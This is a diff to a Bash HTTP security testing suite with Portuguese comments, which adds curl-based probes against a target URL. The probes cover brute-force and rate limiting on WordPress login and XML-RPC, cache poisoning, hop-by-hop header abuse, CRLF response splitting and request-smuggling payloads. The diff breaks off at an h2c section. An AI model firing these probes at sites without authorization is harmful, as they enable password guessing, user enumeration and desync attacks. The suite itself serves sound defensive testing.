@@ -1,12 +1,12 @@
 #!/bin/bash
 #==============================================================================
 # HTTP Header Security Testing Suite - EXPANDED VERSION
-# Versão: 3.3.0
+# Versão: 4.1.0
 # Descrição: Script abrangente para testes de segurança de cabeçalhos HTTP
 #==============================================================================
 
 set -uo pipefail
-VERSION="3.3.0"
+VERSION="4.1.0"
 
 # Cores
 RED='\033[0;31m'
@@ -62,7 +62,7 @@ show_banner() {
     echo -e "${CYAN}"
     echo "╔═══════════════════════════════════════════════════════════════════════════╗"
     echo "║          HTTP Header Security Testing Suite v${VERSION} - EXPANDED        ║"
-    echo "║                     500+ Security Tests Available                         ║"
+    echo "║                     800+ Security Tests Available                         ║"
     echo "╚═══════════════════════════════════════════════════════════════════════════╝"
     echo -e "${NC}"
 }
@@ -1097,6 +1097,223 @@ test_injection_vulnerabilities() {
 }
 
 #==============================================================================
+# RATE LIMITING TESTS - Brute Force Protection (30+ testes)
+#==============================================================================
+test_rate_limiting() {
+    print_section "⏱️ TESTES DE RATE LIMITING (Proteção Brute-Force)"
+    
+    local rate_limit_detected=0
+    local request_count=20
+    
+    # -------------------------------------------------------------------------
+    # WP-LOGIN.PHP Rate Limiting
+    # -------------------------------------------------------------------------
+    print_subsection "WordPress Login (wp-login.php)"
+    
+    echo -e "  ${YELLOW}ℹ️  Enviando $request_count requisições rápidas para wp-login.php...${NC}"
+    
+    local blocked_count=0
+    local success_count=0
+    
+    for i in $(seq 1 $request_count); do
+        local response
+        response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
+            -X POST \
+            -d "log=admin&pwd=wrongpassword$i&wp-submit=Log+In" \
+            --connect-timeout 5 \
+            --max-time 10 \
+            "${URL}/wp-login.php" 2>/dev/null)
+        
+        if [[ "$response" == "429" ]] || [[ "$response" == "403" ]] || [[ "$response" == "503" ]]; then
+            blocked_count=$((blocked_count + 1))
+            if [[ $blocked_count -eq 1 ]]; then
+                echo -e "  ${GREEN}[✓]${NC} Rate limit detectado na requisição #$i (HTTP $response)"
+                rate_limit_detected=1
+            fi
+        else
+            success_count=$((success_count + 1))
+        fi
+    done
+    
+    if [[ $blocked_count -gt 0 ]]; then
+        PASSED_TESTS=$((PASSED_TESTS + 1))
+        echo -e "  ${GREEN}[✓] PASS:${NC} Rate limiting ativo - $blocked_count de $request_count requisições bloqueadas"
+    else
+        FAILED_TESTS=$((FAILED_TESTS + 1))
+        echo -e "  ${RED}[✗] FAIL:${NC} Sem rate limiting - todas as $request_count requisições passaram!"
+    fi
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    
+    # -------------------------------------------------------------------------
+    # XMLRPC Rate Limiting
+    # -------------------------------------------------------------------------
+    print_subsection "XMLRPC Multicall Attack"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando rate limiting em xmlrpc.php...${NC}"
+    
+    blocked_count=0
+    for i in $(seq 1 10); do
+        local response
+        response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
+            -X POST \
+            -H "Content-Type: application/xml" \
+            -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</value></string><value><string>password'$i'</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>' \
+            --connect-timeout 5 \
+            --max-time 10 \
+            "${URL}/xmlrpc.php" 2>/dev/null)
+        
+        if [[ "$response" == "429" ]] || [[ "$response" == "403" ]] || [[ "$response" == "405" ]] || [[ "$response" == "503" ]]; then
+            blocked_count=$((blocked_count + 1))
+        fi
+    done
+    
+    if [[ $blocked_count -gt 0 ]]; then
+        PASSED_TESTS=$((PASSED_TESTS + 1))
+        echo -e "  ${GREEN}[✓] PASS:${NC} XMLRPC bloqueado ou rate-limited ($blocked_count/10)"
+    else
+        FAILED_TESTS=$((FAILED_TESTS + 1))
+        echo -e "  ${RED}[✗] FAIL:${NC} XMLRPC sem proteção - vulnerável a brute-force!"
+    fi
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    
+    # -------------------------------------------------------------------------
+    # Admin-Ajax Rate Limiting
+    # -------------------------------------------------------------------------
+    print_subsection "Admin-Ajax Endpoint"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando rate limiting em admin-ajax.php...${NC}"
+    
+    blocked_count=0
+    for i in $(seq 1 15); do
+        local response
+        response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
+            -X POST \
+            -d "action=heartbeat" \
+            --connect-timeout 5 \
+            --max-time 10 \
+            "${URL}/wp-admin/admin-ajax.php" 2>/dev/null)
+        
+        if [[ "$response" == "429" ]] || [[ "$response" == "403" ]] || [[ "$response" == "503" ]]; then
+            blocked_count=$((blocked_count + 1))
+        fi
+    done
+    
+    if [[ $blocked_count -gt 0 ]]; then
+        PASSED_TESTS=$((PASSED_TESTS + 1))
+        echo -e "  ${GREEN}[✓] PASS:${NC} Admin-Ajax rate-limited ($blocked_count/15)"
+    else
+        echo -e "  ${YELLOW}[?] WARN:${NC} Admin-Ajax sem rate limiting detectado"
+    fi
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    
+    # -------------------------------------------------------------------------
+    # REST API Rate Limiting
+    # -------------------------------------------------------------------------
+    print_subsection "REST API Endpoints"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando rate limiting na REST API...${NC}"
+    
+    blocked_count=0
+    for i in $(seq 1 15); do
+        local response
+        response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
+            --connect-timeout 5 \
+            --max-time 10 \
+            "${URL}/wp-json/wp/v2/users" 2>/dev/null)
+        
+        if [[ "$response" == "429" ]] || [[ "$response" == "403" ]] || [[ "$response" == "503" ]]; then
+            blocked_count=$((blocked_count + 1))
+        fi
+    done
+    
+    if [[ $blocked_count -gt 0 ]]; then
+        PASSED_TESTS=$((PASSED_TESTS + 1))
+        echo -e "  ${GREEN}[✓] PASS:${NC} REST API rate-limited ($blocked_count/15)"
+    else
+        FAILED_TESTS=$((FAILED_TESTS + 1))
+        echo -e "  ${RED}[✗] FAIL:${NC} REST API sem rate limiting - user enumeration possível!"
+    fi
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    
+    # -------------------------------------------------------------------------
+    # TESTES INDIVIDUAIS DE ENDPOINTS SENSÍVEIS
+    # -------------------------------------------------------------------------
+    print_subsection "Endpoints Sensíveis (testes individuais)"
+    
+    # Testar se wp-login.php aceita requisições POST
+    test_curl "wp-login.php POST" "block" -A "$UA" -Lk -X POST -d "log=admin&pwd=test" "${URL}/wp-login.php"
+    
+    # Testar recuperação de senha
+    test_curl "wp-login.php lostpassword" "block" -A "$UA" -Lk "${URL}/wp-login.php?action=lostpassword"
+    
+    # Testar registro (se habilitado, pode ser explorado)
+    test_curl "wp-login.php register" "block" -A "$UA" -Lk "${URL}/wp-login.php?action=register"
+    
+    # Testar confirmação de ação
+    test_curl "wp-login.php postpass" "block" -A "$UA" -Lk -X POST "${URL}/wp-login.php?action=postpass"
+    
+    # Testar xmlrpc
+    test_curl "xmlrpc.php GET" "block" -A "$UA" -Lk "${URL}/xmlrpc.php"
+    test_curl "xmlrpc.php POST" "block" -A "$UA" -Lk -X POST "${URL}/xmlrpc.php"
+    
+    # Testar author enumeration
+    test_curl "Author enum ?author=1" "block" -A "$UA" -Lk "${URL}/?author=1"
+    test_curl "Author enum ?author=2" "block" -A "$UA" -Lk "${URL}/?author=2"
+    
+    # Testar user enumeration via REST
+    test_curl "REST user enum" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users"
+    test_curl "REST user enum specific" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users/1"
+    
+    # -------------------------------------------------------------------------
+    # CONCURRENT REQUESTS TEST
+    # -------------------------------------------------------------------------
+    print_subsection "Teste de Requisições Concorrentes"
+    
+    echo -e "  ${YELLOW}ℹ️  Enviando 10 requisições simultâneas...${NC}"
+    
+    local concurrent_blocked=0
+    
+    # Usar xargs ou background jobs para requisições paralelas
+    for i in $(seq 1 10); do
+        curl -s -o /dev/null -w "%{http_code}\n" -A "$UA" -Lk \
+            -X POST \
+            -d "log=admin&pwd=concurrent$i" \
+            --connect-timeout 5 \
+            --max-time 10 \
+            "${URL}/wp-login.php" 2>/dev/null &
+    done
+    wait
+    
+    # Verificar última resposta
+    local final_response
+    final_response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
+        -X POST \
+        -d "log=admin&pwd=finaltest" \
+        --connect-timeout 5 \
+        --max-time 10 \
+        "${URL}/wp-login.php" 2>/dev/null)
+    
+    if [[ "$final_response" == "429" ]] || [[ "$final_response" == "403" ]] || [[ "$final_response" == "503" ]]; then
+        PASSED_TESTS=$((PASSED_TESTS + 1))
+        echo -e "  ${GREEN}[✓] PASS:${NC} Servidor bloqueou após requisições concorrentes (HTTP $final_response)"
+    else
+        FAILED_TESTS=$((FAILED_TESTS + 1))
+        echo -e "  ${RED}[✗] FAIL:${NC} Servidor não bloqueou requisições concorrentes (HTTP $final_response)"
+    fi
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    
+    # -------------------------------------------------------------------------
+    # SUMMARY
+    # -------------------------------------------------------------------------
+    echo ""
+    if [[ $rate_limit_detected -eq 1 ]]; then
+        echo -e "  ${GREEN}✅ Rate limiting detectado no servidor${NC}"
+    else
+        echo -e "  ${RED}⚠️  Rate limiting NÃO detectado - servidor pode estar vulnerável a brute-force!${NC}"
+    fi
+}
+
+#==============================================================================
 # PATH/URL BYPASS TECHNIQUES (40+ testes)
 #==============================================================================
 test_path_bypass() {
@@ -1236,6 +1453,612 @@ test_path_bypass() {
 }
 
 #==============================================================================
+# HTTP PROTOCOL VERSION TESTS (HTTP/1.0, HTTP/1.1, HTTP/2, HTTP/3)
+#==============================================================================
+test_http_protocols() {
+    print_section "🌐 TESTES DE VERSÕES DE PROTOCOLO HTTP (20 testes)"
+    
+    print_subsection "HTTP/1.0 (Legacy - deve ser bloqueado ou limitado)"
+    # HTTP/1.0 é considerado obsoleto e pode ser bloqueado por segurança
+    test_curl "HTTP/1.0: GET request" "block" -A "$UA" -Lk --http1.0 "$URL"
+    test_curl "HTTP/1.0: HEAD request" "block" -A "$UA" -Lk --http1.0 -X HEAD "$URL"
+    test_curl "HTTP/1.0: POST request" "block" -A "$UA" -Lk --http1.0 -X POST "$URL"
+    test_curl "HTTP/1.0: sem Host header" "block" -A "$UA" -Lk --http1.0 -H "Host:" "$URL"
+    
+    print_subsection "HTTP/1.1 (Padrão - deve funcionar)"
+    test_curl "HTTP/1.1: GET request" "allow" -A "$UA" -Lk --http1.1 "$URL"
+    test_curl "HTTP/1.1: HEAD request" "allow" -A "$UA" -Lk --http1.1 -X HEAD "$URL"
+    test_curl "HTTP/1.1: POST request" "allow" -A "$UA" -Lk --http1.1 -X POST "$URL"
+    test_curl "HTTP/1.1: com Keep-Alive" "allow" -A "$UA" -Lk --http1.1 -H "Connection: keep-alive" "$URL"
+    
+    print_subsection "HTTP/2 (Moderno - deve funcionar se suportado)"
+    # Verificar se o servidor suporta HTTP/2
+    local http2_supported
+    http2_supported=$(curl -s -o /dev/null -w "%{http_version}" --http2 -Lk "$URL" 2>/dev/null || echo "0")
+    if [[ "$http2_supported" == "2" ]]; then
+        echo -e "  ${GREEN}ℹ️  HTTP/2 suportado pelo servidor${NC}"
+        test_curl "HTTP/2: GET request" "allow" -A "$UA" -Lk --http2 "$URL"
+        test_curl "HTTP/2: HEAD request" "allow" -A "$UA" -Lk --http2 -X HEAD "$URL"
+        test_curl "HTTP/2: POST request" "allow" -A "$UA" -Lk --http2 -X POST "$URL"
+        test_curl "HTTP/2: com multiplex headers" "allow" -A "$UA" -Lk --http2 -H "X-Custom: test" "$URL"
+    else
+        echo -e "  ${YELLOW}⚠️  HTTP/2 não suportado ou não detectado pelo servidor${NC}"
+        # Testa se a conexão falha graciosamente ao forçar HTTP/2
+        test_curl "HTTP/2: forçando conexão" "allow" -A "$UA" -Lk --http2 "$URL"
+    fi
+    
+    # HTTP/2 prior knowledge (sem upgrade HTTP/1.1)
+    test_curl "HTTP/2 prior knowledge" "allow" -A "$UA" -Lk --http2-prior-knowledge "$URL" 2>/dev/null || echo "  [?] HTTP/2 prior knowledge não suportado"
+    
+    print_subsection "HTTP/3 (QUIC - experimental)"
+    # Verificar se curl foi compilado com suporte a HTTP/3
+    local curl_http3_support
+    curl_http3_support=$(curl --version 2>/dev/null | grep -i "http3\|quic" || echo "")
+    
+    if [[ -n "$curl_http3_support" ]]; then
+        echo -e "  ${GREEN}ℹ️  curl com suporte a HTTP/3 detectado${NC}"
+        local http3_supported
+        http3_supported=$(curl -s -o /dev/null -w "%{http_version}" --http3 -Lk "$URL" 2>/dev/null || echo "0")
+        if [[ "$http3_supported" == "3" ]]; then
+            echo -e "  ${GREEN}ℹ️  HTTP/3 suportado pelo servidor${NC}"
+            test_curl "HTTP/3: GET request" "allow" -A "$UA" -Lk --http3 "$URL"
+            test_curl "HTTP/3: HEAD request" "allow" -A "$UA" -Lk --http3 -X HEAD "$URL"
+            test_curl "HTTP/3: POST request" "allow" -A "$UA" -Lk --http3 -X POST "$URL"
+        else
+            echo -e "  ${YELLOW}⚠️  HTTP/3 não suportado pelo servidor${NC}"
+            # Tenta fallback para HTTP/3 only
+            test_curl "HTTP/3: tentativa de conexão" "allow" -A "$UA" -Lk --http3-only "$URL" 2>/dev/null || echo "  [SKIP] HTTP/3 only falhou (esperado se servidor não suporta)"
+        fi
+    else
+        echo -e "  ${YELLOW}⚠️  curl não foi compilado com suporte a HTTP/3 (--http3)${NC}"
+        echo -e "  ${YELLOW}   Instale curl-http3 ou compile curl com nghttp3 e ngtcp2${NC}"
+    fi
+    
+    print_subsection "Testes de Segurança por Protocolo"
+    # Testar ataques específicos por versão de protocolo
+    test_curl "HTTP/1.0: Connection header" "block" -A "$UA" -Lk --http1.0 -H "Connection: keep-alive" "$URL"
+    test_curl "HTTP/1.1: PUT method" "block" -A "$UA" -Lk --http1.1 -X PUT "$URL"
+    test_curl "HTTP/1.1: DELETE method" "block" -A "$UA" -Lk --http1.1 -X DELETE "$URL"
+    test_curl "HTTP/2: PUT method" "block" -A "$UA" -Lk --http2 -X PUT "$URL"
+    test_curl "HTTP/2: TRACE method" "block" -A "$UA" -Lk --http2 -X TRACE "$URL"
+    
+    print_subsection "Protocol Downgrade Attacks"
+    # Tentar forçar downgrade de protocolo
+    test_curl "Downgrade: Upgrade header para HTTP/1.0" "block" -A "$UA" -Lk -H "Upgrade: HTTP/1.0" "$URL"
+    test_curl "Downgrade: Connection: Upgrade" "block" -A "$UA" -Lk -H "Connection: Upgrade" -H "Upgrade: h2c" "$URL"
+}
+
+#==============================================================================
+# HOP-BY-HOP HEADERS ABUSE (RFC 2616)
+#==============================================================================
+test_hop_by_hop_headers() {
+    print_section "🔗 TESTES DE HOP-BY-HOP HEADERS ABUSE (25 testes)"
+    
+    print_subsection "Headers Hop-by-Hop Padrão"
+    test_curl "HBH: Connection: close" "block" -A "$UA" -Lk -H "Connection: close, X-Foo" -H "X-Foo: bar" "$URL"
+    test_curl "HBH: Connection com header custom" "block" -A "$UA" -Lk -H "Connection: X-Custom-Header" -H "X-Custom-Header: test" "$URL"
+    test_curl "HBH: Keep-Alive manipulation" "block" -A "$UA" -Lk -H "Connection: Keep-Alive" -H "Keep-Alive: timeout=999999" "$URL"
+    test_curl "HBH: Proxy-Connection" "block" -A "$UA" -Lk -H "Proxy-Connection: keep-alive" "$URL"
+    test_curl "HBH: Proxy-Authenticate" "block" -A "$UA" -Lk -H "Proxy-Authenticate: Basic realm=test" "$URL"
+    test_curl "HBH: Proxy-Authorization" "block" -A "$UA" -Lk -H "Proxy-Authorization: Basic YWRtaW46YWRtaW4=" "$URL"
+    test_curl "HBH: TE header" "block" -A "$UA" -Lk -H "TE: trailers, deflate" "$URL"
+    test_curl "HBH: Trailer header" "block" -A "$UA" -Lk -H "Trailer: X-Checksum" "$URL"
+    test_curl "HBH: Upgrade header" "block" -A "$UA" -Lk -H "Upgrade: websocket" "$URL"
+    
+    print_subsection "Abusing Connection Header para Bypass"
+    test_curl "HBH: Remover X-Forwarded-For" "block" -A "$UA" -Lk -H "Connection: X-Forwarded-For" -H "X-Forwarded-For: 127.0.0.1" "$URL"
+    test_curl "HBH: Remover X-Real-IP" "block" -A "$UA" -Lk -H "Connection: X-Real-IP" -H "X-Real-IP: 192.168.1.1" "$URL"
+    test_curl "HBH: Remover Authorization" "block" -A "$UA" -Lk -H "Connection: Authorization" -H "Authorization: Bearer token" "$URL"
+    test_curl "HBH: Remover Cookie" "block" -A "$UA" -Lk -H "Connection: Cookie" --cookie "session=abc123" "$URL"
+    test_curl "HBH: Remover X-Forwarded-Host" "block" -A "$UA" -Lk -H "Connection: X-Forwarded-Host" -H "X-Forwarded-Host: evil.com" "$URL"
+    test_curl "HBH: Remover X-Forwarded-Proto" "block" -A "$UA" -Lk -H "Connection: X-Forwarded-Proto" -H "X-Forwarded-Proto: https" "$URL"
+    
+    print_subsection "Múltiplos Headers Hop-by-Hop"
+    test_curl "HBH: Múltiplos em Connection" "block" -A "$UA" -Lk -H "Connection: close, X-Foo, X-Bar, Keep-Alive" "$URL"
+    test_curl "HBH: Connection duplicado" "block" -A "$UA" -Lk -H "Connection: close" -H "Connection: keep-alive" "$URL"
+    test_curl "HBH: Transfer-Encoding em Connection" "block" -A "$UA" -Lk -H "Connection: Transfer-Encoding" -H "Transfer-Encoding: chunked" "$URL"
+    test_curl "HBH: Content-Length em Connection" "block" -A "$UA" -Lk -H "Connection: Content-Length" -H "Content-Length: 0" "$URL"
+    
+    print_subsection "Headers de Proxy Customizados"
+    test_curl "HBH: X-Proxy-Connection" "block" -A "$UA" -Lk -H "X-Proxy-Connection: keep-alive" "$URL"
+    test_curl "HBH: X-Forwarded-By" "block" -A "$UA" -Lk -H "X-Forwarded-By: evil-proxy" "$URL"
+    test_curl "HBH: Via header manipulation" "block" -A "$UA" -Lk -H "Via: 1.1 evil-proxy.com" "$URL"
+    test_curl "HBH: Forwarded header" "block" -A "$UA" -Lk -H "Forwarded: for=127.0.0.1;proto=http;by=evil-proxy" "$URL"
+    test_curl "HBH: Max-Forwards zero" "block" -A "$UA" -Lk -H "Max-Forwards: 0" -X TRACE "$URL"
+    test_curl "HBH: Max-Forwards negativo" "block" -A "$UA" -Lk -H "Max-Forwards: -1" "$URL"
+}
+
+#==============================================================================
+# CACHE POISONING / CACHE DECEPTION
+#==============================================================================
+test_cache_poisoning() {
+    print_section "💉 TESTES DE CACHE POISONING / CACHE DECEPTION (30 testes)"
+    
+    print_subsection "Cache Key Manipulation"
+    test_curl "Cache: X-Forwarded-Host poisoning" "block" -A "$UA" -Lk -H "X-Forwarded-Host: evil.com" "$URL"
+    test_curl "Cache: X-Forwarded-Scheme" "block" -A "$UA" -Lk -H "X-Forwarded-Scheme: nothttps" "$URL"
+    test_curl "Cache: X-Original-URL" "block" -A "$UA" -Lk -H "X-Original-URL: /admin" "$URL"
+    test_curl "Cache: X-Rewrite-URL" "block" -A "$UA" -Lk -H "X-Rewrite-URL: /admin" "$URL"
+    test_curl "Cache: X-Host" "block" -A "$UA" -Lk -H "X-Host: evil.com" "$URL"
+    test_curl "Cache: X-Forwarded-Server" "block" -A "$UA" -Lk -H "X-Forwarded-Server: evil.com" "$URL"
+    
+    print_subsection "Unkeyed Headers Abuse"
+    test_curl "Cache: X-Forwarded-Port" "block" -A "$UA" -Lk -H "X-Forwarded-Port: 1337" "$URL"
+    test_curl "Cache: X-Forwarded-SSL" "block" -A "$UA" -Lk -H "X-Forwarded-SSL: off" "$URL"
+    test_curl "Cache: X-URL-Scheme" "block" -A "$UA" -Lk -H "X-URL-Scheme: http" "$URL"
+    test_curl "Cache: Origin header" "block" -A "$UA" -Lk -H "Origin: https://evil.com" "$URL"
+    test_curl "Cache: X-Custom-IP-Auth" "block" -A "$UA" -Lk -H "X-Custom-IP-Authorization: 127.0.0.1" "$URL"
+    
+    print_subsection "Fat GET Requests"
+    test_curl "Cache: Fat GET com body" "block" -A "$UA" -Lk -X GET -d "admin=true" "$URL"
+    test_curl "Cache: GET com Content-Type" "block" -A "$UA" -Lk -X GET -H "Content-Type: application/json" -d '{"admin":true}' "$URL"
+    
+    print_subsection "Cache Deception via Path"
+    test_curl "Cache Deception: /profile.css" "block" -A "$UA" -Lk "${URL}/profile/settings.css"
+    test_curl "Cache Deception: /profile.js" "block" -A "$UA" -Lk "${URL}/profile/settings.js"
+    test_curl "Cache Deception: /profile.png" "block" -A "$UA" -Lk "${URL}/profile/settings.png"
+    test_curl "Cache Deception: /api/user.css" "block" -A "$UA" -Lk "${URL}/api/user.css"
+    test_curl "Cache Deception: path;.css" "block" -A "$UA" -Lk "${URL}/account;.css"
+    test_curl "Cache Deception: path%2F.css" "block" -A "$UA" -Lk "${URL}/account%2F.css"
+    test_curl "Cache Deception: /..%2f..%2f.css" "block" -A "$UA" -Lk "${URL}/..%2f..%2f.css"
+    
+    print_subsection "Response Splitting para Cache Poisoning"
+    test_curl "Cache: CRLF em parâmetro" "block" -A "$UA" -Lk "${URL}?param=%0d%0aSet-Cookie:+admin=true"
+    test_curl "Cache: Header injection" "block" -A "$UA" -Lk -H $'X-Inject: test\r\nX-Cache-Poisoned: true' "$URL"
+    
+    print_subsection "Cache Control Manipulation"
+    test_curl "Cache: Cache-Control: no-cache bypass" "block" -A "$UA" -Lk -H "Cache-Control: no-cache, no-store, must-revalidate" "$URL"
+    test_curl "Cache: Pragma: no-cache" "block" -A "$UA" -Lk -H "Pragma: no-cache" "$URL"
+    test_curl "Cache: If-None-Match manipulation" "block" -A "$UA" -Lk -H "If-None-Match: *" "$URL"
+    test_curl "Cache: If-Modified-Since futuro" "block" -A "$UA" -Lk -H "If-Modified-Since: Sun, 01 Jan 2099 00:00:00 GMT" "$URL"
+    
+    print_subsection "Vary Header Abuse"
+    test_curl "Cache: Accept-Language switch" "block" -A "$UA" -Lk -H "Accept-Language: xx-EVIL" "$URL"
+    test_curl "Cache: Accept-Encoding evil" "block" -A "$UA" -Lk -H "Accept-Encoding: evil-encoding" "$URL"
+    test_curl "Cache: User-Agent variation" "block" -A "$UA" -Lk -A "EvilBot/1.0 CachePoisoning" "$URL"
+}
+
+#==============================================================================
+# HTTP CONNECTION CONTAMINATION
+#==============================================================================
+test_connection_contamination() {
+    print_section "🦠 TESTES DE HTTP CONNECTION CONTAMINATION (20 testes)"
+    
+    print_subsection "Connection State Pollution"
+    test_curl "Contamination: Keep-Alive com dados extra" "block" -A "$UA" -Lk -H "Connection: keep-alive" -H "Keep-Alive: timeout=300, max=1000" "$URL"
+    test_curl "Contamination: Content-Length: 0 + body" "block" -A "$UA" -Lk -H "Content-Length: 0" -d "hidden-data" "$URL"
+    test_curl "Contamination: Chunked + CL" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Content-Length: 10" "$URL"
+    
+    print_subsection "Pipeline Pollution"
+    test_curl "Contamination: Pipeline request" "block" -A "$UA" -Lk -H "Connection: keep-alive" -H "X-Pipeline-Test: 1" "$URL"
+    test_curl "Contamination: Pipelined GET" "block" -A "$UA" -Lk --http1.1 -H "Connection: keep-alive" "$URL"
+    
+    print_subsection "Request Queue Poisoning"
+    test_curl "Contamination: Host header mismatch" "block" -A "$UA" -Lk -H "Host: internal-server" "$URL"
+    test_curl "Contamination: Multiple Host" "block" -A "$UA" -Lk -H "Host: target.com" -H "Host: evil.com" "$URL"
+    test_curl "Contamination: X-Forwarded-Host poison" "block" -A "$UA" -Lk -H "X-Forwarded-Host: evil.com" -H "Host: target.com" "$URL"
+    
+    print_subsection "Backend Connection Abuse"
+    test_curl "Contamination: X-Backend-Server" "block" -A "$UA" -Lk -H "X-Backend-Server: internal:8080" "$URL"
+    test_curl "Contamination: X-Real-Destination" "block" -A "$UA" -Lk -H "X-Real-Destination: http://internal/admin" "$URL"
+    test_curl "Contamination: X-Upstream-Host" "block" -A "$UA" -Lk -H "X-Upstream-Host: localhost" "$URL"
+    
+    print_subsection "Response Queue Poisoning"
+    test_curl "Contamination: Accept diferente" "block" -A "$UA" -Lk -H "Accept: application/x-malicious" "$URL"
+    test_curl "Contamination: Accept-Charset exotic" "block" -A "$UA" -Lk -H "Accept-Charset: x-evil-charset" "$URL"
+    
+    print_subsection "Protocol Confusion"
+    test_curl "Contamination: WebSocket upgrade parcial" "block" -A "$UA" -Lk -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" "$URL"
+    test_curl "Contamination: HTTP/2 upgrade malicioso" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" "$URL"
+    test_curl "Contamination: CONNECT tunnel" "block" -A "$UA" -Lk -X CONNECT -H "Host: internal:22" "$URL"
+    test_curl "Contamination: Expect: 100-continue" "block" -A "$UA" -Lk -H "Expect: 100-continue" -d "test" "$URL"
+    test_curl "Contamination: Expect malformed" "block" -A "$UA" -Lk -H "Expect: 200-ok" "$URL"
+    test_curl "Contamination: Transfer-Encoding: identity" "block" -A "$UA" -Lk -H "Transfer-Encoding: identity" "$URL"
+}
+
+#==============================================================================
+# HTTP RESPONSE SMUGGLING / DESYNC
+#==============================================================================
+test_response_smuggling() {
+    print_section "🔀 TESTES DE HTTP RESPONSE SMUGGLING / DESYNC (25 testes)"
+    
+    print_subsection "Response Splitting"
+    test_curl "RSmuggling: CRLF em header" "block" -A "$UA" -Lk -H $'X-Test: value\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>' "$URL"
+    test_curl "RSmuggling: Header injection via param" "block" -A "$UA" -Lk "${URL}?test=%0d%0aHTTP/1.1%20200%20OK"
+    test_curl "RSmuggling: Set-Cookie injection" "block" -A "$UA" -Lk "${URL}?x=%0d%0aSet-Cookie:%20admin=true"
+    
+    print_subsection "Response Queue Desync"
+    test_curl "RSmuggling: CL.0 Desync" "block" -A "$UA" -Lk -H "Content-Length: 0" -X POST -d "" "$URL"
+    test_curl "RSmuggling: TE.0 Desync" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -X POST -d "0\r\n\r\n" "$URL"
+    test_curl "RSmuggling: H2.0 Desync" "block" -A "$UA" -Lk --http2 -X POST -H "Content-Length: 0" "$URL"
+    
+    print_subsection "Content-Length Desync"
+    test_curl "RSmuggling: CL maior que body" "block" -A "$UA" -Lk -H "Content-Length: 1000" -d "small" "$URL"
+    test_curl "RSmuggling: CL zero com body" "block" -A "$UA" -Lk -H "Content-Length: 0" -d "hidden" --http1.1 "$URL"
+    test_curl "RSmuggling: CL negativo" "block" -A "$UA" -Lk -H "Content-Length: -50" "$URL"
+    test_curl "RSmuggling: CL com espaços" "block" -A "$UA" -Lk -H "Content-Length:  100" "$URL"
+    test_curl "RSmuggling: CL com tabs" "block" -A "$UA" -Lk -H $'Content-Length:\t100' "$URL"
+    
+    print_subsection "Chunked Encoding Desync"
+    test_curl "RSmuggling: Chunk size malformado" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -d "ZZZ\r\ndata\r\n0\r\n\r\n" "$URL"
+    test_curl "RSmuggling: Chunk extension" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -d "5;ext=val\r\nhello\r\n0\r\n\r\n" "$URL"
+    test_curl "RSmuggling: Trailing headers" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Trailer: X-End" -d "5\r\nhello\r\n0\r\nX-End: value\r\n\r\n" "$URL"
+    
+    print_subsection "Browser Desync via Timeout"
+    test_curl "RSmuggling: Slow headers" "block" -A "$UA" -Lk --speed-time 1 --speed-limit 1 "$URL" 2>/dev/null || true
+    
+    print_subsection "HTTP/2 Response Desync"
+    test_curl "RSmuggling: H2 pseudo-header" "block" -A "$UA" -Lk --http2 -H ":authority: evil.com" "$URL" 2>/dev/null || true
+    test_curl "RSmuggling: H2 CONTINUATION flood" "block" -A "$UA" -Lk --http2 -H "X-Long: $(head -c 16000 /dev/zero | tr '\0' 'A')" "$URL"
+    
+    print_subsection "Protocol Smuggling"
+    test_curl "RSmuggling: HTTP/1.1 em HTTP/2" "block" -A "$UA" -Lk --http2 -H "Transfer-Encoding: chunked" "$URL"
+    test_curl "RSmuggling: Via header abuse" "block" -A "$UA" -Lk -H "Via: HTTP/2.0 evil-proxy" "$URL"
+    test_curl "RSmuggling: X-HTTP-Version" "block" -A "$UA" -Lk -H "X-HTTP-Version: 1.0" "$URL"
+    
+    print_subsection "Encoding Desync"
+    test_curl "RSmuggling: Transfer-Encoding capitalizado" "block" -A "$UA" -Lk -H "Transfer-ENCODING: chunked" "$URL"
+    test_curl "RSmuggling: TE com null byte" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked%00" "$URL"
+    test_curl "RSmuggling: TE com vírgula" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked, identity" "$URL"
+    test_curl "RSmuggling: TE múltiplo" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: identity" "$URL"
+}
+
+#==============================================================================
+# H2C SMUGGLING (HTTP/2 Cleartext)
+#==============================================================================
+test_h2c_smuggling() {
+    print_section "🚀 TESTES DE H2C SMUGGLING (20 testes)"
+    
+    echo -e "  ${YELLOW}ℹ️  H2C permite upgrade de HTTP/1.1 para HTTP/2 sem TLS${NC}"
+    echo -e "  ${YELLOW}   Pode ser usado para bypass de proxy e acesso a endpoints internos${NC}"
+    echo ""
+    
+    print_subsection "H2C Upgrade Requests"
